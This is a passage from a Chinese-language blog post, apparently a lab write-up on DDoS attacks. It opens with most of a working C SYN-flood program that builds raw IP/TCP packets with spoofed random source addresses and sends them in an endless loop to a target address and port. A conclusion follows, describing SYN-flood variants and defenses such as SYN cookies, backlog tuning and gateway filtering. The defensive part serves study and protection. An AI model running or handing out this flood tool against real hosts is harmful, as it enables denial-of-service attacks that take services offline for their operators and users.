</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> )(~cksum);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_ip_header(<span style="color:#fff;font-weight:bold">struct</span> iphdr *ip, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len = <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr) + <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ip-&gt;ver_and_hdrlen = (<span style="color:#ff0;font-weight:bold">4</span>&lt;&lt;<span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr)/<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>));
</span></span><span style="display:flex;"><span>    ip-&gt;tos = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;total_len = htons(len);
</span></span><span style="display:flex;"><span>    ip-&gt;id = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;flags = <span style="color:#ff0;font-weight:bold">0x40</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;ttl = <span style="color:#ff0;font-weight:bold">255</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    ip-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;srcaddr = srcaddr; <span style="color:#007f7f">// 源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip-&gt;dstaddr = dstaddr; <span style="color:#007f7f">// 目标IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 初始化 tcp 包
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_tcp_header(<span style="color:#fff;font-weight:bold">struct</span> tcphdr *tcp, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    tcp-&gt;sport = htons(rand() % <span style="color:#ff0;font-weight:bold">16383</span> + <span style="color:#ff0;font-weight:bold">49152</span>);   <span style="color:#007f7f">// 随机生成一个端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;dport = htons(dport);                    <span style="color:#007f7f">// 目标端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;seq = htonl(rand() % <span style="color:#ff0;font-weight:bold">90000000</span> + <span style="color:#ff0;font-weight:bold">2345</span> );  <span style="color:#007f7f">// 随机生成一个初始化序列号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;ack_seq = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;len = (<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr) / <span style="color:#ff0;font-weight:bold">4</span> &lt;&lt; <span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#ff0;font-weight:bold">0</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;flag = <span style="color:#ff0;font-weight:bold">0x02</span>; <span style="color:#007f7f">// 0x02 代表 是syn 包，tcp三次连接请求的开始
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;win = htons(<span style="color:#ff0;font-weight:bold">1024</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;urg = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 初始化 tcp 伪报头
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_pseudo_header(<span style="color:#fff;font-weight:bold">struct</span> pseudohdr *pseudo, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    pseudo-&gt;zeros = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    pseudo-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    pseudo-&gt;length = htons(<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr));
</span></span><span style="display:flex;"><span>    pseudo-&gt;saddr = srcaddr;
</span></span><span style="display:flex;"><span>    pseudo-&gt;daddr = dstaddr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> make_syn_packet(<span style="color:#fff;font-weight:bold">char</span> *packet, <span style="color:#fff;font-weight:bold">int</span> pkt_len, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> daddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> buf[<span style="color:#ff0;font-weight:bold">100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> iphdr ip;          <span style="color:#007f7f">//IP 头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> tcphdr tcp;        <span style="color:#007f7f">//TCP 头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> pseudohdr pseudo;  <span style="color:#007f7f">//TCP 伪头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> saddr = rand();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    len = <span style="color:#fff;font-weight:bold">sizeof</span>(ip) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 初始化头部信息
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    init_ip_header(&amp;ip, saddr, daddr);
</span></span><span style="display:flex;"><span>    init_tcp_header(&amp;tcp, dport);
</span></span><span style="display:flex;"><span>    init_pseudo_header(&amp;pseudo, saddr, daddr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//计算IP校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip.checksum = checksum((u_short *)&amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 计算TCP校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    bzero(buf, <span style="color:#fff;font-weight:bold">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    memcpy(buf , &amp;pseudo, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo));           <span style="color:#007f7f">// 复制TCP伪头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    memcpy(buf + <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp)); <span style="color:#007f7f">// 复制TCP头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp.checksum = checksum((u_short *)buf, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(packet, pkt_len);
</span></span><span style="display:flex;"><span>    memcpy(packet, &amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>    memcpy(packet + <span style="color:#fff;font-weight:bold">sizeof</span>(ip), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> len;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 创造原始套接字
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> make_raw_socket()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> on = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 创建一个原始套接字, 指定其关注TCP协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (fd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 设置需要手动构建IP头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (<span style="color:#fff;font-weight:bold">char</span> *)&amp;on, <span style="color:#fff;font-weight:bold">sizeof</span>(on)) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>        close(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/*
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">	在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函	  数设置 IP 头部由我们自己构建
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">	*/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> fd;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> send_syn_packet(<span style="color:#fff;font-weight:bold">int</span> sockfd, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> sockaddr_in skaddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> packet[<span style="color:#ff0;font-weight:bold">256</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> pkt_len;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(&amp;skaddr, <span style="color:#fff;font-weight:bold">sizeof</span>(skaddr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    skaddr.sin_family = AF_INET;
</span></span><span style="display:flex;"><span>    skaddr.sin_port = htons(port); 
</span></span><span style="display:flex;"><span>    skaddr.sin_addr.s_addr = addr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	printf(<span style="color:#0ff;font-weight:bold">&#34;%d已攻击!</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>,addr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pkt_len = make_syn_packet(packet, <span style="color:#ff0;font-weight:bold">256</span>, addr, port);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> sendto(sockfd, packet, pkt_len, <span style="color:#ff0;font-weight:bold">0</span>, (<span style="color:#fff;font-weight:bold">struct</span> sockaddr *)&amp;skaddr,
</span></span><span style="display:flex;"><span>                  <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> sockaddr));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 主函数 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> main(<span style="color:#fff;font-weight:bold">int</span> argc, <span style="color:#fff;font-weight:bold">char</span> *argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> sockfd;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (argc &lt; <span style="color:#ff0;font-weight:bold">3</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Usage: synflood &lt;address&gt; &lt;port&gt;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// argv[1] 目的地址 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#007f7f">// argc[2] 目的端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    addr = inet_addr(argv[<span style="color:#ff0;font-weight:bold">1</span>]);
</span></span><span style="display:flex;"><span>    port = atoi(argv[<span style="color:#ff0;font-weight:bold">2</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 判断端口是否 存在
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (port &lt; <span style="color:#ff0;font-weight:bold">0</span> || port &gt; <span style="color:#ff0;font-weight:bold">65535</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Invalid destination port number: %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, argv[<span style="color:#ff0;font-weight:bold">2</span>]);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 开启socket
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    sockfd = make_raw_socket();
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (sockfd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to make raw socket</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	<span style="color:#007f7f">// for 无限循环，发送syn包
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">for</span> (;;) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (send_syn_packet(sockfd, addr, port) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>            fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Failed to send syn packet</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    close(sockfd);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="0x06-实验结论">0x06 实验结论<a hidden class="anchor" aria-hidden="true" href="#0x06-实验结论">#</a></h2>
<ul>
<li>
<p>udp_flood攻击就是构造大量的udp包(可以携带少量数据，也可以携带大量数据，携带数据量越大对服务器的载荷承受就越严重)，占用服务器大量的处理内存，从而引起服务器崩溃。</p>
</li>
<li>
<p>SYN-Flood三种攻击方式</p>
<ul>
<li>Direct Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。</li>
<li>Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。</li>
<li>Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击</li>
</ul>
</li>
<li>
<p>防御手段</p>
</li>
<li>
<p>Udp_Flood</p>
<ul>
<li>大多数操作系统部分限制了ICMP报文的响应速率，以中断需要ICMP响应的DDoS攻击。这种缓解的一个缺点是在攻击过程中，合法的数据包也可能被过滤。如果UDP Flood的容量足够高以使目标服务器的防火墙的状态表饱和，则在服务器级别发生的任何缓解都将不足以应对目标设备上游的瓶颈。</li>
<li>判断包大小，如果是大包攻击则使用防止UDP碎片方法：根据攻击包大小设定包碎片重组大小，通常不小于1500。在极端情况下，可以考虑丢弃所有UDP碎片。</li>
</ul>
</li>
<li>
<p>SYN-Flood</p>
<ul>
<li>
<p>缩短超时（SYN Timeout）时间</p>
<ul>
<li>
<p>由于SYN Flood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下，可以成倍的降低服务器的负荷。但过低的SYN Timeout设置可能会影响客户的正常访问。</p>
<p>注意：缩短SYN Timeout时间仅在对方攻击频度不高的情况下生效</p>
</li>
</ul>
</li>
<li>
<p>增加最大半连接数</p>
<ul>
<li>More Actions在Linux中执行命令”sysctl -agrep net.ipv4.tcp_max_syn_backlog”可以查看最大半连接数，一般来说大小为128，这个默认值对于Web服务器来说是远远不够的，一次简单的SYN攻击就足以将其完全占用。</li>
<li>因此，防御DOS攻击最简单的办法就是增大这个默认值，在Linux中执行命令”sysctl -w et.ipv4.tcp_max_syn_backlog=3000”，这样就可以将队列SYN最大半连接数容量值改为3000了</li>
</ul>
</li>
<li>
<p>过滤网关防护</p>
<ul>
<li>
<p>一种方式是防止墙确认连接的有效性后，防火墙才会向内部服务器发起SYN请求。防火墙代服务器发出的SYN ACK包使用的序列号为c, 而真正的服务器回应的序列号为c’, 这样，在每个数据报文经过防火墙的时候进行序列号的修改。</p>
</li>
<li>
<p>另一种方式是防火墙确定了连接的安全后，会发出一个safe reset命令，client会进行重新连接，这时出现的syn报文会直接放行。这样不需要修改序列号了。但是，client需要发起两次握手过程，因此建立连接的时间将会延长。</p>
</li>
</ul>
</li>
<li>
<p>SYN cookies技术</p>
<ul>
<li>给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，并记录地址信息，以后从这个IP地址来的包会被一概丢弃。这样做的结果也可能会影响到正常用户的访问。</li>
</ul>
</li>
</ul>
</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://www.reus09.top/tags/ddos/">ddos</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://www.reus09.top/posts/tech/%E6%A0%88%E6%BA%A2%E5%87%BA/">
    <span class="title">« Prev</span>
    <br>
    <span>栈溢出</span>
  </a>
  <a class="next" href="http://www.reus09.top/posts/tech/arp%E6%AC%BA%E9%AA%97/">
    <span class="title">Next »</span>
    <br>
    <span>Arp欺骗</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
